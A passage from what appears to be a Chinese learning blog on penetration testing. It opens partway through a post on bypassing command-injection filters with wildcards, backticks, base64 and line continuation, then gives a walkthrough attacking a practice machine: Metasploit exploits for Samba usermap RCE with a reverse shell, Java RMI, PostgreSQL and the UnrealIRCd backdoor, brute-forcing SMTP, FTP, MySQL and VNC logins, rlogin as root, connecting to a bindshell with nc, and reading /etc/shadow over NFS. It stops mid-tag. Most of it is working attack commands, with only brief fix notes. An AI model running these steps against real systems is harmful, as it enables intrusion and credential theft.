class="string">&#x27;&#x27;</span></span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> /???/?at flag</span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> /???/?at ????</span><br><span class="line">you are good!</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> /???/?[<span class="type">a</span>]<span class="string">&#x27;&#x27;</span>[<span class="type">t</span>] ?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;&#x27;</span></span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure>我服了，这都可以？长见识666🍭<br><code>*</code>下众生平等🥙</li></ol><h2 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`命令`和$(命令)都是执行命令的方式</span><br></pre></td></tr></table></figure><p>栗子：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;m0re`cat flag`&quot;</span></span><br><span class="line"><span class="string">m0reyou are good!</span></span><br><span class="line"><span class="string">zxcv0221@kali:~/桌面<span class="variable">$</span> echo &quot;</span>m0re <span class="variable">$</span>(<span class="built_in">cat</span> flag)<span class="string">&quot;</span></span><br><span class="line"><span class="string">m0re you are good!</span></span><br><span class="line"><span class="string">zxcv0221@kali:~/桌面<span class="variable">$</span> echo &quot;</span>m0re <span class="variable">$</span>(<span class="built_in">pwd</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">m0re /home/zxcv0221/桌面</span></span><br></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>使用base64编码进行绕过</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> `echo <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 <span class="literal">-d</span>`</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><h2 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h2><h3 id="gt-和-gt-gt-两个符号的使用"><a href="#gt-和-gt-gt-两个符号的使用" class="headerlink" title="&gt;和&gt;&gt;两个符号的使用"></a><code>&gt;</code>和<code>&gt;&gt;</code>两个符号的使用</h3><p>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入<br><img src="https://img-blog.csdnimg.cn/20200710131921488.png" alt="m0re" loading="lazy"><br><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容<br><img src="https://img-blog.csdnimg.cn/20200710132050310.png" alt="m0re" loading="lazy"></p><h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><p>换行执行命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> ca\</span><br><span class="line">&gt; t\</span><br><span class="line">&gt;  <span class="built_in">fl</span>\</span><br><span class="line">&gt; ag</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200710132232739.png" alt="m0re" loading="lazy"><br>可以尝试写一个文件来执行命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;ca\\&quot;</span>&gt;shell</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> <span class="built_in">cat</span> shell</span><br><span class="line">ca\</span><br><span class="line">t\</span><br><span class="line"> <span class="built_in">fl</span>\</span><br><span class="line">ag</span><br><span class="line">zxcv0221@kali:~/桌面<span class="variable">$</span> sh shell</span><br><span class="line">you are good!</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200710132704301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>还有一种是使用kali中的一个工具，名字叫metasploit<br>学会使用，需要实践利用，这里就不演示了，就像我之前写的提权的那篇文章就用到了metasploit，这个确实是一个非常强大的工具。我已经爱上这个工具了。<br>目前这些应该就够我现阶段用的了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/">命令执行漏洞利用及绕过方式总结</a><br><a href="https://www.cnblogs.com/ophxc/p/12826497.html">命令执行漏洞，绕过过滤姿势</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞利用</title>
      <link href="/2020/08/23/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2020/08/23/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>继续进行漏洞的学习利用。<br>接上学到smtp服务。</p><h2 id="smtp服务漏洞利用"><a href="#smtp服务漏洞利用" class="headerlink" title="smtp服务漏洞利用"></a>smtp服务漏洞利用</h2><h3 id="smtp暴力破解"><a href="#smtp暴力破解" class="headerlink" title="smtp暴力破解"></a>smtp暴力破解</h3><p>一、smtp版本信息获取<br>使用metasploit中的<code>smtp-version</code>模块探测smtp服务的版本信息，目标：<code>129.121.22.119</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/smtp/smtp_version</span><br><span class="line">set rhosts 129.121.22.119</span><br><span class="line"><span class="meta">#</span><span class="bash"> 期间可以使用命令“show options”来查看需要<span class="built_in">set</span>的信息</span></span><br><span class="line">exploit</span><br><span class="line"><span class="meta">#</span><span class="bash">查看到相应的信息</span></span><br></pre></td></tr></table></figure><p>这样就能看到smtp的相关版本信息</p><p>二、smtp验证方式<br>参考链接——<a href="https://en.wikipedia.org/wiki/SMTP_Authentication">传送门</a></p><p>三、medusa工具介绍<br>medusa是一款用来破解不同协议用户名和密码的专用软件，kali自带。<br>medusa破解smtp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 目标IP地址 -u 用户名 -P 字典文件 -M 协议模块</span><br><span class="line"><span class="meta">#</span><span class="bash">栗子：</span></span><br><span class="line">medusa -h 129.121.22.119 -u test -P /root/Desktop/password.txt -M smtp</span><br></pre></td></tr></table></figure><p><code>medusa -d </code><br>列出medusa支持破解的模块<br>其中的操作过程中可以使用wireshark进行抓包，抓取服务smtp，打开<code>eth0</code><br>如果破解到smtp服务的密码，就可以登录到smtp相应的服务器。</p><p>OK关于smtp的学习告一段落。</p><h2 id="rpcbind漏洞利用"><a href="#rpcbind漏洞利用" class="headerlink" title="rpcbind漏洞利用"></a>rpcbind漏洞利用</h2><p>一、介绍<br>通俗来说，rpcbind是NFS中用来进行消息通知的服务。<br>一般情况下rpcbind运行在111端口。并且NFS配置开启<code>rpcbind_enable=&quot;YES&quot;</code><br>靶机就不搭了，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.106</span><br></pre></td></tr></table></figure><p>查看目标IP是否开启rpcbind服务<br>二、探测目标rpcbind<br>使用<code>nmap -sV -p 111 IP地址</code><br>可以探测目标的rpcbind版本信息<br> <code>searchaploit rpcbind</code><br> 查看有无可利用的脚本<br> 三、nmap脚本探测<br> 在nmap中使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script=rpcinfo 目标IP</span><br></pre></td></tr></table></figure><p>用来探测目标的rpcinfo泄露的信息。</p><p>四、metasploit模块探测</p><p>使用metasploit下的 auxiliary/scanner/misc/sunrpc_portmapper进行目标探测。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/misc/sunrpc_portmapper</span><br><span class="line">set rhosts 192.168.1.106</span><br><span class="line">show info</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>就可以查看到一系列信息。</p><h2 id="smb-RCE远程命令执行"><a href="#smb-RCE远程命令执行" class="headerlink" title="smb-RCE远程命令执行"></a>smb-RCE远程命令执行</h2><p>一、samba介绍<br>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB(Server Messages Block，信息服务块)是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。<br>一般运行在 139、445端口。<br>二、探测目标samba<br>使用<code>nmap -sV -p 139 445 IP地址</code> 探测目标端口服务版本信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 139 445 192.168.1.106</span><br></pre></td></tr></table></figure><p>三、metasploit漏洞利用<br>在metasploit中集成了利用samba usermap RCE的脚本。<br><code>exploit/multi/samba/usermap_script</code><br>进行利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/samba/usermap_script</span><br><span class="line"><span class="meta">#</span><span class="bash">show options</span></span><br><span class="line">set rhosts 192.168.1.106#设置远程计算机的IP地址</span><br><span class="line"><span class="meta">#</span><span class="bash">show options 查看设置是否成功</span></span><br><span class="line">show payloads#查看可以使用的payload</span><br><span class="line"><span class="meta">#</span><span class="bash">选择一个反弹的payload</span></span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line"><span class="meta">#</span><span class="bash">再次进行show options会发现需要设置本地的IP地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash">使用ifconfig查看当前IP地址</span></span><br><span class="line">set lhost 192.168.1.105</span><br><span class="line"><span class="meta">exploit#</span><span class="bash">进行漏洞利用</span></span><br><span class="line"><span class="meta">#</span><span class="bash">就可以使用终端命令进行漏洞利用</span></span><br></pre></td></tr></table></figure><p>进入之后就可以先查看一下当前用户和相关权限。<br>四、防御和修复<br>在Metasploit show info 可以查看漏洞信息<br>在使用samba版本为3.0.20到3.0.25版本之间的samba会存在这样的漏洞，所以我们的修复方案就是<code>升级samba</code><br>还是在上面演示中的那个模块里面，设置好配置后，可以使用<code>show info</code>查看版本信息等</p><h2 id="rlogin最高权限登录"><a href="#rlogin最高权限登录" class="headerlink" title="rlogin最高权限登录"></a>rlogin最高权限登录</h2><p>一、rlogin介绍<br>远程登录(rlogin)是一个Unix命令，他允许授权用户进入网络中的其他Unix机器并且就像用户在现场操作一样。一旦进入主机，用户可以操作主机允许的任何事情。<br>使用nmap进行扫描，如果探测到<code>exec</code>和<code>login</code>两个服务，两个是rlogin的标配通常情况下在512和513端口开放这两个服务。<br>二、探测目标rlogin<br>使用<code>nmap -sV -p 512 513 IP地址</code>探测目标rlogin版本信息。<br>512用于对远程执行的进程进行验证、513反弹bash shell<br>三、rlogin最高权限登录<br>使用以下命令可以进行登录<br>rlogin -l root IP地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l root 192.168.1.106</span><br></pre></td></tr></table></figure><p>输入<code>rlogin -h</code>查看帮助信息<br>然后就登录进入相对应的系统，并且身份是root<br>四、防御修复<br>1、添加root用户登陆验证密码<br>2、关闭rlogin服务，改用ssh等服务来管理服务器</p><h2 id="后门连接"><a href="#后门连接" class="headerlink" title="后门连接"></a>后门连接</h2><p>探测后门<br>某些情况下，服务器可能存在某些后门。可以使用nmap进行探测。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">探测开启服务</span></span><br><span class="line">nmap 192.168.40.147</span><br><span class="line"><span class="meta">#</span><span class="bash">如发现ingreslock服务开启，则进一步探测</span></span><br><span class="line">nmap -p 1524 -sV 192.168.40.147</span><br><span class="line"><span class="meta">#</span><span class="bash">发现是个绑定shell，service信息为bindshell</span></span><br><span class="line"><span class="meta">#</span><span class="bash">使用nc连接后门获取权限nc [ip] [port]</span></span><br><span class="line">nc 192.168.40.147 1524</span><br><span class="line"><span class="meta">#</span><span class="bash">然后就可以连接成功使用终端命令行工具</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200722191748961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到已经成功了，关于nc的使用，我也写过一篇介绍和简单的使用方法。有兴趣可以看下。<br>拓展：为什么会产生后门？<br>1.可能之前这个服务器已经经历过黑客攻击，并且留下了shell，我们就可以使用先前的现成的shell进行连接。<br>2.网站管理员在进行管理时，可能需要通过反弹shell进行，于是设置一个shell等待连接，期间我们也可以使用shell进行连接。<br>3.可能是某些软件本身就存在连接shell的后门</p><h2 id="NFS获取目标密码文件"><a href="#NFS获取目标密码文件" class="headerlink" title="NFS获取目标密码文件"></a>NFS获取目标密码文件</h2><h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><p>NSF(Network File System)即网络文件系统，是freeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件。<br>可以使用nmap查看目标IP地址是否开启了NFS服务。</p><h3 id="探测目标nfs"><a href="#探测目标nfs" class="headerlink" title="探测目标nfs"></a>探测目标nfs</h3><p>可以使用nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=nfs-* [ip]</span><br></pre></td></tr></table></figure><p>可以查看到相应的信息</p><h3 id="探测nfs是否可以导出"><a href="#探测nfs是否可以导出" class="headerlink" title="探测nfs是否可以导出"></a>探测nfs是否可以导出</h3><p>使用showmount命令确定“/”共享(文件系统的根)是否正在导出。可能需要安装nfs-common包才能使用<code>showmount</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-commmon</span><br><span class="line"><span class="meta">#</span><span class="bash">安装成功后，执行</span></span><br><span class="line">showmount -e [ip]</span><br><span class="line"><span class="meta">#</span><span class="bash">如果回显文件等信息了，则证明可以导出</span></span><br></pre></td></tr></table></figure><h3 id="查看导出内容"><a href="#查看导出内容" class="headerlink" title="查看导出内容"></a>查看导出内容</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir nfs_root</span><br><span class="line">mount -t nfs [ip]:/~/nfs_root -o nolock#进行挂载，无加密</span><br><span class="line">cat ~/nfs_root/etc/shadow</span><br></pre></td></tr></table></figure><p>即可查看系统中所有文件。</p><h2 id="反序列化远程命令执行漏洞"><a href="#反序列化远程命令执行漏洞" class="headerlink" title="反序列化远程命令执行漏洞"></a>反序列化远程命令执行漏洞</h2><h3 id="Java-rmi介绍"><a href="#Java-rmi介绍" class="headerlink" title="Java rmi介绍"></a>Java rmi介绍</h3><p>Java rmi指的是远程方法调用。它是一种机制，能够让在某个Java虚拟机上的对象调用另一个Java虚拟机中的对象上的方法。<br>RMI是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RNI对象是一个远程Java对象。可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法。可以像调用本地Java对象一样。<br>对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象。迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。<br>RMI的传输100%基于序列化。</p><h3 id="探测目标rmi"><a href="#探测目标rmi" class="headerlink" title="探测目标rmi"></a>探测目标rmi</h3><p>使用<code>nmap -p 1099 -sV [ip] </code>探测目标的版本信息。<br><img src="https://img-blog.csdnimg.cn/20200722185225990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>服务是开启的，还能看到版本信息。</p><h3 id="rmi远程命令执行利用"><a href="#rmi远程命令执行利用" class="headerlink" title="rmi远程命令执行利用"></a>rmi远程命令执行利用</h3><p>利用metasploit进行漏洞利用<br>先打开metasploit，<br><img src="https://img-blog.csdnimg.cn/20200722185506112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用<code>use exploit/multi/misc/java_rmi_server </code><br>然后进行配置参数<br><img src="https://img-blog.csdnimg.cn/20200722190621740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200722190713177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这样就基本差不多了，可以进行攻击了。</p><h3 id="进行漏洞攻击"><a href="#进行漏洞攻击" class="headerlink" title="进行漏洞攻击"></a>进行漏洞攻击</h3><p><img src="https://img-blog.csdnimg.cn/20200722190808522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>显示session已经被创建了，所以直接利用就行了。<br><img src="https://img-blog.csdnimg.cn/20200722190926956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以执行一些命令。<br>emmm，如果不知道可以执行哪些命令，就输入一个问号<code>?</code>回车查看。<br><img src="https://img-blog.csdnimg.cn/2020072219115458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这些都是可以执行的命令。</p><h2 id="proftpd测试"><a href="#proftpd测试" class="headerlink" title="proftpd测试"></a>proftpd测试</h2><h3 id="探测目标proftpd"><a href="#探测目标proftpd" class="headerlink" title="探测目标proftpd"></a>探测目标proftpd</h3><p>使用<code>nmap -sV -p 2121 192.168.40.147</code><br><img src="https://img-blog.csdnimg.cn/20200723105436960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>探测出版本信息是<code>1.3.1</code></p><p>然后可以在searchsploit中寻找该版本的漏洞信息。<br><img src="https://img-blog.csdnimg.cn/20200723105613973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出<code>1.3</code>的版本是有的，但是<code>1.3.1</code>额版本没有找到信息，我们可以直接暴力破解它的用户名和密码</p><h3 id="msf暴力破解密码"><a href="#msf暴力破解密码" class="headerlink" title="msf暴力破解密码"></a>msf暴力破解密码</h3><p>使用metasploit下的<code>auxiliary/scanner/ftp/ftp_login</code>进行目标探测。<br><img src="https://img-blog.csdnimg.cn/20200723105132283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>设置参数，注意设置暴力破解的字典时，用户名和密码设置的是file类型的。然后运行就可以开始暴力破解。<br>由于知道靶机的用户名和密码，所以就直接使用正确的用户名和密码来测试。<br><img src="https://img-blog.csdnimg.cn/20200723110018680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>成功的话，前面的标志就是绿色。</p><h2 id="mysql弱口令破解"><a href="#mysql弱口令破解" class="headerlink" title="mysql弱口令破解"></a>mysql弱口令破解</h2><p>版本信息的探测已经相对熟练了，还是用nmap进行探测3306端口（一般mysql服务都是在3306端口）<br>仍然使用metasploit进行暴力破解mysql的用户名和密码。<br>使用的模块是<code>auxiliary/scanner/mysql/mysql_login</code><br><img src="https://img-blog.csdnimg.cn/20200723111807416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到这里是用户名为<code>root</code>密码为空成功登录<br>到这里就可以使用mysql登录了。<br><img src="https://img-blog.csdnimg.cn/20200723111922184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>主要就是对metasploit的熟练使用。</p><h2 id="postgresql数据库密码破解"><a href="#postgresql数据库密码破解" class="headerlink" title="postgresql数据库密码破解"></a>postgresql数据库密码破解</h2><p>介绍不再多介绍，百度都有。<br>直接探测目标<code>postgresql</code><br>因为如果使用nmap进行初次大致扫描的话是可以直接扫出来有服务开启的，然后就可以知道是哪个端口上运行该服务，然后直接扫描相应的端口就行了。<br>这里已经扫出来该项服务运行在5432端口，所以一直姐扫描这个端口就可以知道它的版本信息等。<br>扫描对应的端口，上面那么多次扫描，已经可以熟练掌握，就不用再放图。<br>破解postgresql的用户名和密码仍然使用metasploit中的模块来进行破解。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200723114429511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>破解出用户名和密码，下面可以利用它来登陆。<br>登陆postgresql可以使用一个第三方软件<code>pyadmin</code>来登陆postgresql进行查看信息。<br>没有下载这个软件，所以就没有操作。(这个软件是可以在windows系统中下载的，可以下载到物理机上面进行操作)</p><h3 id="postgresql代码执行利用"><a href="#postgresql代码执行利用" class="headerlink" title="postgresql代码执行利用"></a>postgresql代码执行利用</h3><p>利用msf下postgresql的代码执行获得反弹shell<br>利用的模块是<code>exploit/linux/postgres/postgres_payload</code><br>设置IP和端口，不过端口一般不用设置，默认设置好的。<br><img src="https://img-blog.csdnimg.cn/20200723133838716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>exploit</code>开始攻击。<br>输入<code>?</code>可查看可执行的命令，<br>会有一个反弹的shell，输入<code>shell</code>即可利用<br><img src="https://img-blog.csdnimg.cn/20200723134035188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是得到的权限不是root权限，能执行的操作有限。</p><h3 id="防御和修复"><a href="#防御和修复" class="headerlink" title="防御和修复"></a>防御和修复</h3><p>防御：屏蔽任意IP连接postgresql</p><p>修复：升级版本，安全配置。</p><h2 id="VNC密码破解"><a href="#VNC密码破解" class="headerlink" title="VNC密码破解"></a>VNC密码破解</h2><h3 id="VNC简单介绍"><a href="#VNC简单介绍" class="headerlink" title="VNC简单介绍"></a>VNC简单介绍</h3><blockquote><p>VNC(Virtual Network<br>Console)是虚拟网络控制条的缩写。它是一款优秀的远程控制工具软件，由著名的AT&amp;T的欧洲研究实验室开发的。可视化控制，类似于远程桌面，默认VNC服务端运行在5900端口。</p></blockquote><p>可以使用nmap测试目标是否开启VNC服务。</p><h3 id="探测目标VNC"><a href="#探测目标VNC" class="headerlink" title="探测目标VNC"></a>探测目标VNC</h3><p>精致探测就直接探测具体端口，直接使用nmap。<br>查看版本信息和其他信息。</p><h3 id="msf破解VNC密码"><a href="#msf破解VNC密码" class="headerlink" title="msf破解VNC密码"></a>msf破解VNC密码</h3><p>依旧是利用metasploit的模块进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br></pre></td></tr></table></figure><p>然后设置rhost，至于字典文件可以自己设置，也可以不设置。因为默认有一个字典。当然实际操作时，需要自己找字典。现在因为是靶机，就是用自带的字典就可以了。<br><img src="https://img-blog.csdnimg.cn/20200723135857586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>用户名为空，密码为<code>password</code><br>所以就可以进行登录了。</p><h3 id="VNC客户端登录"><a href="#VNC客户端登录" class="headerlink" title="VNC客户端登录"></a>VNC客户端登录</h3><p>windows下安装<code>vnc viewer</code>客户端软件连接VNC服务端。<br>使用方法百度有，需要时再查。<br>呃呃呃至于防御，密码设置的难一点。再开监控（不会，以后再学）就OK了。</p><h2 id="irc后门利用"><a href="#irc后门利用" class="headerlink" title="irc后门利用"></a>irc后门利用</h2><p>前面的一些介绍省略。<br>默认情况下，irc运行在6667端口。<br>然后还是使用nmap进行探测版本号等信息。利用<code>searchsploit</code>搜索可以利用的poc。<br><img src="https://img-blog.csdnimg.cn/20200723141125198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到了后门可以利用。<br>利用msf中使用irc后门连接的模块进行连接对应的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br></pre></td></tr></table></figure><p>直接设置rhost就可以开始攻击了。<br><img src="https://img-blog.csdnimg.cn/20200723141329368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>而且可以看出，反弹的shell是root用户权限。可以执行任何操作。</p><h2 id="tomcat管理密码破解"><a href="#tomcat管理密码破解" class="headerlink" title="tomcat管理密码破解"></a>tomcat管理密码破解</h2><p>这个需要复制一下介绍，以前见过不过没了解，这次看一下。</p><blockquote><p>Tomcat服务器是一个免费的开源代码的web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合普遍使用，是开发和调试jsp程序的首选。</p></blockquote><p>默认情况下，8180端口是tomcat管理的http端口。</p><h3 id="探测目标tomcat"><a href="#探测目标tomcat" class="headerlink" title="探测目标tomcat"></a>探测目标tomcat</h3><p><img src="https://img-blog.csdnimg.cn/20200723143948616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看出是Apache和jsp集成的服务。<br>还有版本信息等。<br>可以直接访问，看到这个界面<br><img 